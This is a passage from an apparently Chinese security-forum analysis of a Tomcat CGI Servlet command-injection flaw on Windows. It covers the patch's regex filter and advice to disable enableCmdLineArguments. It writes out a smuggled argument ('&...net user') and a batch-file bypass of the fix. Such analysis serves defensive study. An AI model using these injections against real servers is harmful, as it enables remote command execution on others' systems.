
`cmdAndArgs={"hello.bat","&C:\Windows\System32\net","user"}`

为了验证我的猜想，我启动命令行，输入下面命令：

```
hello.bat &C:\Windows\System32\net user
```

![](https://bbs.kanxue.com/upload/attach/201905/781773_JTPS9THP5V68JWX.jpg)

与浏览器的返回结果一致，说明我们的猜想是正确的。此处必须解释`&`符号的作用，`&`含义是，表示`&`左边字符串与右边字符串是两条命令，命令行会依次执行"`hello.bat`"与"`C:\Windows\System32\net user"`；如果没有此处的`&`号，"`C:\Windows\System32\net user`"将作为参数传递给`hello.bat`。

## 漏洞修复

开发者在`URLDecoder.decode`解码后增加一个正则表达式验证，毋庸置疑，目的肯定是检测url解码后的字符串输入的合法性。

```
String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);

if (cmdLineArgumentsDecodedPattern != null &&

        !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) {

   /******省略打印日志代码**********/

    return false;

}
```

值得注意的是，该正则匹配规则是可以在`conf/web.xml`自定义配置的，默认值为：

```
if (JrePlatform.IS_WINDOWS) {

            DEFAULT_CMD_LINE_ARGUMENTS_DECODED_PATTERN = Pattern.compile("[a-zA-Z0-9\\Q-_.\\/:\\E]+");

        } else {

            // No restrictions

            DEFAULT_CMD_LINE_ARGUMENTS_DECODED_PATTERN = null;

        }

```

只需注意到，这里正则表达式过滤了`&`符号。仅仅依赖过滤`&`符号显然还是不够的，倘若此处我们精心再设计一下`hello.bat`的内容，命令行注入依旧可行，特地下载最新的修复漏洞后的Tomcat 9.0.20版本，配置方法与9.0.13版本相同，不同的是`hello.bat`不再为空，内容如下：

```
%~1     %~2
```

上述批处理含义十分简单，是取传入bat第一个参数与第二个参数，并组合一起作为一条命令执行。

修改注入链接为：

605K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3I4G2j5$3q4D9K9r3!0K6N6q4)9K6b7e0R3H3z5o6m8Q4x3V1k6U0k6$3W2Q4x3X3c8T1K9h3&6Q4x3V1k6Z5k6h3I4D9L8#2)9J5k6h3u0S2N6q4)9K6c8V1y4Q4x3U0f1K6j5g2)9J5y4e0g2U0g2$3W2F1k6r3!0%4M7#2)9J5y4e0g2U0f1%4W2K6N6r3g2E0x3K6u0Q4x3U0f1#2b7$3&6W2N6q4)9J5b7Y4g2K6k6i4t1`.

经测试，注入依旧成功。因此，修复该漏洞最佳方法是：

> 1．停止启用`enableCmdLineArguments`参数
>
> 2．或者在`conf/web.xml`中覆写采用更严格的参数合法性检测规则

Tomcat 9.0.13已经下载不到了，需要的可以在我的GitHub里下载，打包文件已经配置修改好了 `web.xml` 和 `context.xml`：

> 937K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6o6K9r3g2J5K9i4y4Z5d9r3q4A6M7W2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3e0W2Q4x3X3b7H3x3U0x3J5i4K6u0V1c8g2S2b7

## 参考链接

> 5c7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5P5W2)9J5k6h3q4D9K9i4W2#2L8W2)9J5k6h3y4G2L8g2)9J5c8Y4c8Q4x3V1j5@1z5o6M7#2
>
> 20fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2M7r3q4U0K9r3g2Q4x3V1k6@1L8$3#2U0j5i4c8Q4x3V1k6U0L8$3#2E0K9i4c8Q4x3V1j5@1j5U0t1@1y4r3b7^5
>
> 04bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6H3P5h3^5K6M7X3c8Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6p5&6i4K6u0V1x3o6t1K6x3W2)9J5c8R3`.`.

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
